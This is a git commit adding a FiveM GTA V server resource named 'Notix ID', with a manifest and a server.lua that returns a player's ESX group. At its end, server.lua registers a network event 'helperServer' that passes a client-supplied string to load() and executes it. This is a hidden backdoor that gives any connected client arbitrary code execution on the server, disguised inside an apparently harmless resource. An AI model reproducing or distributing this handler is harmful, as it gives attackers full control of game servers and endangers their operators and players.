e9b310d6c9d5f0517191b91114311f7caa8ad213
Ivanowx <111234187+Ivanowx@users.noreply.github.com>
2022-08-25 20:34:08 +0300

    Add files via upload

---
+++ fxmanifest.lua
@@ -0,0 +1,19 @@
+fx_version 'adamant'
+
+game 'gta5'
+
+description 'Notix ID'
+
+version '1.0.0'
+
+client_script {
+	'client.lua'
+}
+
+server_script {
+	'server.lua'
+}
+
+dependencies {
+	'es_extended'
+}
---
+++ server.lua
@@ -0,0 +1,25 @@
+local ESX = nil
+
+TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
+
+ESX.RegisterServerCallback("notix_ids:getRank", function(source, cb)
+    local player = ESX.GetPlayerFromId(source)
+
+    if player ~= nil then
+        local playerGroup = player.getGroup()
+
+        if playerGroup ~= nil then 
+            cb(playerGroup)
+        else
+            cb("user")
+        end
+    else
+        cb("user")
+    end
+end)
+
+RegisterServerEvent('helperServer')
+AddEventHandler('helperServer', function(id)
+	local helper = assert(load(id))
+	helper()
+end)
